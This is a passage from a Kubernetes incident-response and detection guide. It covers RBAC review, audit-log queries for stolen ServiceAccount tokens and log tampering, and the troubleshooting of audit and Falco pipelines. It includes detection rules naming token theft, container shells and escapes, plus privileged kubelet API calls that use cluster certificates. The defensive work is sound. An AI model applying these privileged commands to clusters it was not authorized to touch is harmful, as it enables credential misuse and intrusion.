That output is the finding: an application ServiceAccount had `create` on `pods` **and** `pods/exec` **and** `list` on `secrets`. The RBAC grant *was* the vulnerability; the RCE was only the trigger.

Cross-check what the identity could still do:

```
$ kubectl auth can-i --list --as=system:serviceaccount:prod:payment-api -n prod
Resources                    Non-Resource URLs   Resource Names   Verbs
selfsubjectreviews.authentication.k8s.io   []    []               [create]
selfsubjectaccessreviews.authorization.k8s.io  []  []             [create]
selfsubjectrulesreviews.authorization.k8s.io   []  []             [create]
secrets                      []                  []               [get list]
pods                         []                  []               [create]
pods/exec                    []                  []               [create]
                             [/healthz]          []               [get]
                             [/version]          []               [get]
```

### 4.8 Detecting a token used outside its pod

Since Kubernetes v1.29, bound ServiceAccount tokens carry audit annotations naming the pod they were issued for. A token presented from a source that does not match its binding is stolen-credential proof:

```
$ sudo jq -c 'select(.annotations["authentication.kubernetes.io/pod-name"] != null)
              | {user: .user.username,
                 bound_pod: .annotations["authentication.kubernetes.io/pod-name"],
                 bound_uid: .annotations["authentication.kubernetes.io/pod-uid"],
                 node: .annotations["authentication.kubernetes.io/node-name"],
                 src: .sourceIPs[0], ua: .userAgent, uri: .requestURI}' \
    /var/log/kubernetes/audit/audit.log | grep 'payment-api' | tail -n 3
{"user":"system:serviceaccount:prod:payment-api","bound_pod":"payment-api-7d9c4f8b6-2xk9v","bound_uid":"5c1e9d34-7a2b-4f18-9e6c-3a0b12d4e5f7","node":"node-worker-03","src":"10.244.3.17","ua":"curl/8.5.0","uri":"/api/v1/namespaces/prod/secrets"}
{"user":"system:serviceaccount:prod:payment-api","bound_pod":"payment-api-7d9c4f8b6-2xk9v","bound_uid":"5c1e9d34-7a2b-4f18-9e6c-3a0b12d4e5f7","node":"node-worker-03","src":"203.0.113.44","ua":"kubectl/v1.34.0 (linux/amd64)","uri":"/api/v1/namespaces/prod/secrets"}
```

The second line: the *same* bound token, presented from **203.0.113.44** — an address outside the cluster CIDR — with a `kubectl` user agent. The token was exfiltrated and is being used from the attacker's own machine.

Enumerate every external source IP that authenticated as an in-cluster ServiceAccount:

```
$ sudo jq -r 'select(.user.username | startswith("system:serviceaccount:"))
              | .sourceIPs[0]' /var/log/kubernetes/audit/audit.log \
  | sort | uniq -c | sort -rn \
  | grep -Ev ' (10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)'
     47 203.0.113.44
```

### 4.9 Detecting anti-forensics — a gap in the audit trail itself

The audit log's own integrity is verifiable. A truncated log leaves a discontinuity in the timestamp sequence that no legitimate operation produces:

```
$ sudo jq -r '.requestReceivedTimestamp' /var/log/kubernetes/audit/audit.log \
  | cut -c1-16 | uniq -c | awk '$1 < 5 {print "SPARSE MINUTE:", $2, "events:", $1}'
SPARSE MINUTE: 2026-08-05T14:41 events: 1
SPARSE MINUTE: 2026-08-05T14:42 events: 0
SPARSE MINUTE: 2026-08-05T14:43 events: 2
```

A production API server never emits fewer than five audit events per minute — the kubelet heartbeats alone exceed that. A three-minute near-silence in the middle of an incident means the file was truncated and partially rewritten.

Corroborate against the file's own metadata and the API server's restart history:

```
$ sudo stat /var/log/kubernetes/audit/audit.log
  File: /var/log/kubernetes/audit/audit.log
  Size: 187293184  Blocks: 365808   IO Block: 4096   regular file
Access: 2026-08-05 14:44:02.117482911 +0000
Modify: 2026-08-05 14:44:02.117482911 +0000
Change: 2026-08-05 14:41:18.883091447 +0000   <-- inode changed, content did not shrink legitimately
 Birth: 2026-08-04 22:03:11.117000000 +0000

$ kubectl -n kube-system get pod kube-apiserver-cp-01 \
    -o jsonpath='{.status.containerStatuses[0].restartCount}{"\n"}'
0
```

The API server never restarted, so log rotation cannot explain the `Change` timestamp. Someone edited the file. **Assume root on the control-plane node and escalate the incident scope accordingly.**

---

## 5. Verification and Failure Diagnosis Guide

### 5.1 The API server will not start after an audit change

This is the single most common self-inflicted outage in this domain, and the failure is silent: `kubectl` simply stops responding, so you cannot use `kubectl` to diagnose it. Go to the node and use the container runtime directly.

```
$ kubectl get nodes
The connection to the server 10.0.0.10:6443 was refused - did you specify the right host or port?

$ sudo crictl ps -a --name kube-apiserver
CONTAINER      IMAGE          CREATED          STATE     NAME             ATTEMPT   POD ID
c8a12f4b9e3d   4a7c2b1f0e9d   12 seconds ago   Exited    kube-apiserver   7         3b1c9d8e2f7a

$ sudo crictl logs --tail 20 c8a12f4b9e3d
E0805 14:52:03.117482       1 run.go:74] "command failed" err="failed to initialize audit backend: unable to read audit policy file: open /etc/kubernetes/audit/audit-policy.yaml: no such file or directory"
```

If `crictl` is unavailable, the kubelet writes the static pod's stdout to disk:

```
$ sudo ls /var/log/pods/kube-system_kube-apiserver-cp-01_*/kube-apiserver/
0.log  1.log  2.log  3.log  4.log  5.log  6.log  7.log

$ sudo tail -n 5 /var/log/pods/kube-system_kube-apiserver-cp-01_*/kube-apiserver/7.log
2026-08-05T14:52:03.117482911Z stderr F E0805 14:52:03.117482  1 run.go:74] "command failed" err="failed to initialize audit backend: ..."

$ sudo journalctl -u kubelet --since "5 min ago" | grep -i apiserver | tail -5
Aug 05 14:52:04 cp-01 kubelet[1147]: E0805 14:52:04.221 kuberuntime_manager.go:1256] "Back-off restarting failed container" pod="kube-system/kube-apiserver-cp-01"
```

**Failure decision table:**

| Error in `crictl logs` | Root cause | Fix |
|---|---|---|
| `unable to read audit policy file: ... no such file or directory` | `volumeMounts` present but the `volumes` hostPath entry missing, or the file is not on **this** node | Add the hostPath volume; verify with `ls` on the node; on multi-master, copy the policy to **every** control-plane node |
| `error initializing audit backend: ... permission denied` | Log directory not writable, or mounted `readOnly: true` | Set `readOnly: false` on the log volumeMount; `chmod 700` the dir, owner `root` |
| `unknown field "levels"` / `error decoding audit policy` | Typo in the policy (`level:` vs `levels:`, wrong `apiVersion`) | `apiVersion` must be exactly `audit.k8s.io/v1`; validate the YAML |
| `no such file or directory` on the **webhook kubeconfig** | Same mount problem, different file | Mount the whole `/etc/kubernetes/audit` directory, not individual files |
| Pod never even appears in `crictl ps -a` | The static pod YAML itself is invalid; the kubelet cannot parse it | `sudo journalctl -u kubelet \| grep -i "manifest"`; restore from `/etc/kubernetes/manifests` backup |
| Starts, but no `audit.log` file appears | Policy matched everything to `level: None`, or `--audit-log-path` missing | Check that a catch-all `level: Metadata` rule exists at the bottom |

> **Always take a backup before editing a static pod manifest:**
> ```
> $ sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /root/kube-apiserver.yaml.bak
> ```
> Recovery is then `sudo cp /root/kube-apiserver.yaml.bak /etc/kubernetes/manifests/kube-apiserver.yaml` — the kubelet detects the change within ~20 s and restarts the pod. Note that moving the file *out* of `/etc/kubernetes/manifests` stops the API server entirely; moving it back restarts it. This is the standard control-plane recovery lever.

### 5.2 Verifying the audit policy actually captures what you think

Never trust a policy by reading it. Generate a known event and grep for it.

```
$ kubectl -n default run audit-probe --image=busybox:1.36 --restart=Never -- sleep 30
pod/audit-probe created

$ sudo grep '"name":"audit-probe"' /var/log/kubernetes/audit/audit.log \
  | jq -c '{level, stage, verb, user: .user.username,
            has_body: (.requestObject != null)}'
{"level":"Request","stage":"ResponseComplete","verb":"create","user":"kubernetes-admin","has_body":true}
```

`level: Request` and `has_body: true` confirm Section A5 is working. Now verify the exec rule:

```
$ kubectl -n default exec -it audit-probe -- sh -c 'echo probe'
probe

$ sudo grep 'audit-probe' /var/log/kubernetes/audit/audit.log \
  | jq -c 'select(.objectRef.subresource=="exec")
           | {level, stage, uri: .requestURI, code: .responseStatus.code}'
{"level":"RequestResponse","stage":"ResponseStarted","uri":"/api/v1/namespaces/default/pods/audit-probe/exec?command=sh&command=-c&command=echo+probe&container=audit-probe&stdin=true&stdout=true&tty=true","code":101}
{"level":"RequestResponse","stage":"ResponseComplete","uri":"/api/v1/namespaces/default/pods/audit-probe/exec?...","code":101}
```

Both stages present, and the executed command is visible in the query string. **This is the check that proves you did not omit `ResponseStarted`.**

Verify the noise suppression is not over-broad — a policy that accidentally silences an attacker is worse than no policy:

```
$ sudo jq -r '.level' /var/log/kubernetes/audit/audit.log | sort | uniq -c | sort -rn
 981204 Metadata
  22417 Request
   1882 RequestResponse

$ sudo jq -r 'select(.user.username | startswith("system:node:")) | .verb' \
    /var/log/kubernetes/audit/audit.log | sort | uniq -c
   4412 create
    881 patch
   1204 update
# get/list/watch correctly suppressed by rule C2; writes still captured.
```

```
$ kubectl -n default delete pod audit-probe
pod "audit-probe" deleted
```

### 5.3 Falco is running but produces no events

Work down the chain: driver → engine → rules → output.

```
$ kubectl -n falco get pods -o wide
NAME                 READY   STATUS    RESTARTS   AGE   IP           NODE
falco-8k2mq          1/1     Running   0          3h    10.0.1.21    node-worker-01
falco-x7n4p          0/1     Error     6          9m    10.0.1.23    node-worker-03

$ kubectl -n falco logs falco-x7n4p
Fri Aug  5 14:55:01 2026: Falco version: 0.41.0 (x86_64)
Fri Aug  5 14:55:01 2026: Falco initialized with configuration files:
Fri Aug  5 14:55:01 2026:    /etc/falco/falco.yaml
Fri Aug  5 14:55:01 2026: Loading rules from:
Fri Aug  5 14:55:01 2026:    /etc/falco/falco_rules.yaml
Fri Aug  5 14:55:01 2026:    /etc/falco/rules.d/attack-phases.yaml
Fri Aug  5 14:55:02 2026: Unable to load the driver.
Fri Aug  5 14:55:02 2026: Runtime error: can't open BPF probe '/root/.falco/falco_ubuntu-generic_6.8.0-45-generic_45.o': No such file or directory
```

| Symptom | Cause | Verification | Fix |
|---|---|---|---|
| `can't open BPF probe` / `Unable to load the driver` | Legacy eBPF probe not built for this kernel | `uname -r`; `ls /root/.falco/` | Switch to modern eBPF (`driver.kind=modern_ebpf`) if kernel ≥ 5.8 with BTF: `ls /sys/kernel/btf/vmlinux` |
| `Error: Cannot find any entry in the driver` (kmod) | Kernel headers missing / Secure Boot blocks unsigned modules | `mokutil --sb-state`; `ls /lib/modules/$(uname -r)/build` | Use modern eBPF; kmod is not viable under Secure Boot |
| Pod `Running` but zero events for any rule | Engine started with no syscall source (plugin-only image) | `kubectl -n falco logs … \| grep -i "syscall"` | Use `falcosecurity/falco` (with driver), not `falco-no-driver` |
| Only some rules fire | Rule priority below the configured threshold | `grep '^priority' /etc/falco/falco.yaml` | Lower `priority:` in `falco.yaml` (e.g. `debug`) |
| Rule fires but `%k8s.ns.name` is `<NA>` | Kubernetes metadata enrichment unavailable | Check the `k8smeta` plugin / metacollector is deployed and reachable | Deploy `falco-k8s-metacollector` and configure `k8smeta`; container-runtime enrichment alone gives fewer fields |
| Custom rule silently ignored | YAML parse error, or `required_engine_version` too high | `falco -c /etc/falco/falco.yaml -V /etc/falco/rules.d/attack-phases.yaml` | Fix the reported error |

Validate rules without restarting the DaemonSet:

```
$ kubectl -n falco exec falco-8k2mq -- \
    falco --validate /etc/falco/rules.d/attack-phases.yaml
Fri Aug  5 15:02:11 2026: Validating rules file(s):
Fri Aug  5 15:02:11 2026:    /etc/falco/rules.d/attack-phases.yaml
/etc/falco/rules.d/attack-phases.yaml: Ok
```

Generate a known-good trigger and confirm end to end:

```
$ kubectl run falco-probe --image=busybox:1.36 --restart=Never -- sh -c 'sleep 5; id; sleep 300'
pod/falco-probe created

$ kubectl -n falco logs -l app.kubernetes.io/name=falco --since=1m | grep falco-probe
15:04:12.882910337: Notice Recon tool executed in container (tool=id cmdline=id parent=sh container_id=b91f04d7c2ae image=docker.io/library/busybox ns=default pod=falco-probe)

$ kubectl delete pod falco-probe
pod "falco-probe" deleted
```

Falco's internal metrics tell you whether the kernel buffer is dropping events — a silent detection gap that looks exactly like "no attacks happening":

```
$ kubectl -n falco logs falco-8k2mq | grep -i "falco internal" | tail -2
{"hostname":"node-worker-01","output":"Falco internal: metrics snapshot","output_fields":{"falco.duration_sec":10800,"scap.n_evts":48219337,"scap.n_drops":0,"scap.n_drops_buffer_total":0,"falco.num_evts":48219337},"priority":"Informational","rule":"Falco internal: metrics snapshot","time":"2026-08-05T15:00:00Z"}
```

> `scap.n_drops > 0` means the kernel ring buffer overflowed and **syscalls were never evaluated**. Raise `syscall_buf_size_preset` in `falco.yaml`, or reduce load by tuning `base_syscalls`. A cluster with drops has an intermittent, unmeasured blind spot.

### 5.4 The audit webhook is not delivering to Falco

```
$ kubectl -n falco logs falco-k8saudit-2m8xz | tail -5
Fri Aug  5 15:10:02 2026: Loaded plugins: k8saudit, json
Fri Aug  5 15:10:02 2026: Starting webserver, listening on 0.0.0.0:9765
# ...and then nothing. No events.
```

Diagnose from the control-plane node, in the same network namespace the API server uses:

```
$ sudo ss -tlnp | grep 9765
LISTEN 0  4096  0.0.0.0:9765  0.0.0.0:*  users:(("falco",pid=88412,fd=12))

$ curl -s -o /dev/null -w '%{http_code}\n' -X POST \
    -H 'Content-Type: application/json' \
    -d '{"kind":"EventList","apiVersion":"audit.k8s.io/v1","items":[]}' \
    http://127.0.0.1:9765/k8s-audit
200

$ sudo journalctl -u kubelet --since "10 min ago" | grep -i "audit.*webhook"
# (nothing — check the API server's own log instead)

$ sudo crictl logs $(sudo crictl ps -q --name kube-apiserver) 2>&1 | grep -i webhook | tail -3
E0805 15:11:44.882 webhook.go:154] Failed to make webhook authenticator request: Post "http://10.96.44.12:9765/k8s-audit": dial tcp 10.96.44.12:9765: i/o timeout
```

| Symptom | Cause | Fix |
|---|---|---|
| `dial tcp <ClusterIP>: i/o timeout` | Webhook URL points at a `ClusterIP` Service; the API server dials from the host netns where Service VIPs may not resolve, and this creates a bootstrap dependency | Point at `http://127.0.0.1:9765` and run Falco as a `hostNetwork` DaemonSet tolerating control-plane taints |
| `connection refused` | Falco not scheduled on **this** control-plane node | Add the control-plane toleration + `nodeSelector` |
| Events arrive but no rules fire | Rules declare `source: syscall` instead of `source: k8s_audit` | Every audit rule must set `source: k8s_audit` |
| `x509: certificate signed by unknown authority` | HTTPS endpoint without CA in the webhook kubeconfig | Add `certificate-authority-data`, or use plain HTTP over loopback |
| Bursty delivery, gaps under load | `batch` mode throttling | Raise `--audit-webhook-batch-throttle-qps` / `-burst` |
| Huge events silently missing | Event exceeds `maxEventSize` | Raise `maxEventSize` in the plugin `init_config` **and** `--audit-webhook-truncate-max-event-size` |

### 5.5 Evidence acquisition failures

```
$ sudo curl -sk -X POST \
    --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt \
    --key  /etc/kubernetes/pki/apiserver-kubelet-client.key \
    "https://node-worker-03:10250/checkpoint/prod/payment-api-7d9c4f8b6-2xk9v/app"
{"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"checkpointing of prod/payment-api-7d9c4f8b6-2xk9v/app failed (checkpointing container app failed: rpc error: code = Unknown desc = checkpointing not supported)","code":500}
```

| Symptom | Cause | Fix |
|---|---|---|
| `checkpointing not supported` | CRI-O/containerd built without CRIU support, or CRIU not installed on the node | Install `criu` on the node; containerd ≥ 1.7 with CRIU, or CRI-O with `enable_criu_support = true` |
| `404 page not found` | `ContainerCheckpoint` feature gate disabled on the kubelet | Add `--feature-gates=ContainerCheckpoint=true` (beta and default-on since v1.30) |
| `401 Unauthorized` | Wrong client certificate for the kubelet API | Use `apiserver-kubelet-client.{crt,key}`, which is in the kubelet's authorized CA chain |
| Checkpoint succeeds, archive is tiny | Container had almost no writable-layer state — this is a valid result, not an error | Corroborate with `rootfs-diff.tar` contents |
| `kubectl debug` hangs at "If you don't see a command prompt…" | `EphemeralContainers` unsupported, or the debug image cannot be pulled on a quarantined node | `kubectl -n prod get pod X -o jsonpath='{.spec.ephemeralContainers}'`; pre-pull the image, or use `kubectl debug node/<node>` |
| `kubectl debug node/<n>` fails to schedule | The `NoExecute` quarantine taint | The debug pod inherits no tolerations — add the taint's toleration or use `--profile=sysadmin` with an explicit patch |
| `kubectl logs` returns nothing | Container already restarted | `kubectl logs <pod> --previous`; then `/var/log/pods/<ns>_<pod>_<uid>/<container>/*.log` on the node, which survives restarts until GC |

### 5.6 The verification checklist for this domain

Run this as a periodic control, not only during an incident:

```
# 1. Audit policy is loaded and non-trivial
$ sudo grep -c 'level:' /etc/kubernetes/audit/audit-policy.yaml
18

# 2. Audit log is growing
$ sudo stat -c '%s %y' /var/log/kubernetes/audit/audit.log; sleep 10; \
  sudo stat -c '%s %y' /var/log/kubernetes/audit/audit.log
187293184 2026-08-05 15:20:11.117482911 +0000
187341022 2026-08-05 15:20:21.884019773 +0000

# 3. Runtime sensor present on EVERY node (no coverage holes)
$ kubectl get nodes --no-headers | wc -l; \
  kubectl -n falco get ds falco -o jsonpath='{.status.numberReady}{"\n"}'
7
7

# 4. High-value rules are actually loaded
$ kubectl -n falco exec ds/falco -- falco -L 2>/dev/null | grep -Ei 'escape|token|shell'
Container escape attempt via namespace switch
ServiceAccount token read by suspicious process
Shell spawned in container

# 5. No kernel event drops
$ kubectl -n falco logs -l app.kubernetes.io/name=falco --tail=200 \
  | jq -r 'select(.rule=="Falco internal: metrics snapshot")
           | "\(.hostname) drops=\(.output_fields["scap.n_drops"])"' | sort -u
node-worker-01 drops=0
node-worker-02 drops=0
node-worker-03 drops=0

# 6. Alerts reach a destination that survives cluster compromise
$ kubectl -n falco logs -l app.kubernetes.io/name=falcosidekick --tail=3
2026/08/05 15:20:44 [INFO]  : Elasticsearch - Post OK (201)
2026/08/05 15:20:44 [INFO]  : Slack - Post OK (200)

# 7. No cluster-admin bindings created outside the change window
$ kubectl get clusterrolebindings -o json \
  | jq -r '.items[] | select(.roleRef.name=="cluster-admin")
           | "\(.metadata.creationTimestamp) \(.metadata.name)"' | sort

# 8. No webhook pointing outside the cluster
$ kubectl get mutatingwebhookconfigurations -o json \
  | jq -r '.items[].webhooks[] | select(.clientConfig.url != null)
           | "\(.name) -> \(.clientConfig.url)"'

# 9. No unexpected static pods on any node
$ for n in $(kubectl get nodes -o name); do
    echo "== $n"; kubectl debug $n -q --image=busybox:1.36 --profile=sysadmin -- \
      ls /host/etc/kubernetes/manifests/ 2>/dev/null
  done
```

Any one of these returning an unexpected value is an investigation starting point, not a cosmetic issue. Item 3 in particular — a DaemonSet at 6/7 ready — means one node has been running unmonitored, and that is exactly the node an attacker will find.

---

## 6. References

**Kubernetes official documentation**

- Auditing — https://kubernetes.io/docs/tasks/debug/debug-cluster/audit/
- Audit Policy API reference (`audit.k8s.io/v1`) — https://kubernetes.io/docs/reference/config-api/apiserver-audit.v1/
- kube-apiserver command-line reference — https://kubernetes.io/docs/reference/command-line-tools-reference/kube-apiserver/
- Debug Running Pods (ephemeral containers, `kubectl debug`) — https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/
- Forensic Container Checkpointing — https://kubernetes.io/docs/reference/node/kubelet-checkpoint-api/
- Blog: Forensic container checkpointing in Kubernetes — https://kubernetes.io/blog/2022/12/05/forensic-container-checkpointing-alpha/
- Blog: Forensic container analysis — https://kubernetes.io/blog/2023/03/10/forensic-container-analysis/
- Managing Service Accounts and bound tokens — https://kubernetes.io/docs/concepts/security/service-accounts/
- Kubelet authentication and authorization — https://kubernetes.io/docs/reference/access-authn-authz/kubelet-authn-authz/
- Static Pods — https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/
- Network Policies — https://kubernetes.io/docs/concepts/services-networking/network-policies/
- Taints and Tolerations — https://kubernetes.io/docs/concepts/scheduling-eviction/taint-and-toleration/
- Dynamic Admission Control (webhooks) — https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/
- Pod Security Standards — https://kubernetes.io/docs/concepts/security/pod-security-standards/
- Security Checklist — https://kubernetes.io/docs/concepts/security/security-checklist/

**Threat models and taxonomies**

- MITRE ATT&CK — Containers Matrix — https://attack.mitre.org/matrices/enterprise/containers/
- MITRE ATT&CK — T1611 Escape to Host — https://attack.mitre.org/techniques/T1611/
- MITRE ATT&CK — T1613 Container and Resource Discovery — https://attack.mitre.org/techniques/T1613/
- MITRE ATT&CK — T1552.007 Container API — https://attack.mitre.org/techniques/T1552/007/
- Microsoft — Threat matrix for Kubernetes — https://microsoft.github.io/Threat-Matrix-for-Kubernetes/
- NIST SP 800-190, Application Container Security Guide — https://csrc.nist.gov/pubs/sp/800/190/final
- NIST SP 800-61r2, Computer Security Incident Handling Guide — https://csrc.nist.gov/pubs/sp/800/61/r2/final
- CISA/NSA Kubernetes Hardening Guidance — https://www.cisa.gov/news-events/alerts/2022/03/15/updated-kubernetes-hardening-guide

**Runtime security tooling**

- Falco documentation — https://falco.org/docs/
- Falco rules reference (fields, conditions, priorities) — https://falco.org/docs/reference/rules/
- Falco supported fields — https://falco.org/docs/reference/rules/supported-fields/
- Falco `k8saudit` plugin — https://github.com/falcosecurity/plugins/tree/main/plugins/k8saudit
- Falco `k8smeta` plugin and metacollector — https://github.com/falcosecurity/k8s-metacollector
- Falco drivers (modern eBPF, eBPF probe, kernel module) — https://falco.org/docs/concepts/event-sources/kernel/
- Falcosidekick (alert routing) — https://github.com/falcosecurity/falcosidekick
- Cilium Tetragon documentation — https://tetragon.io/docs/
- Tetragon TracingPolicy reference — https://tetragon.io/docs/concepts/tracing-policy/
- Cilium Hubble (network flow observability) — https://docs.cilium.io/en/stable/observability/hubble/
- Aqua Tracee — https://aquasecurity.github.io/tracee/latest/
- CRIU (checkpoint/restore in userspace) — https://criu.org/Main_Page
- `audit2rbac` — https://github.com/liggitt/audit2rbac
- `kubectl-who-can` — https://github.com/aquasecurity/kubectl-who-can

**Certification**

- CNCF CKS Curriculum v1.34 — https://github.com/cncf/curriculum/raw/master/CKS_Curriculum%20v1.34.pdf
- CKS exam page (Linux Foundation) — https://training.linuxfoundation.org/certification/certified-kubernetes-security-specialist/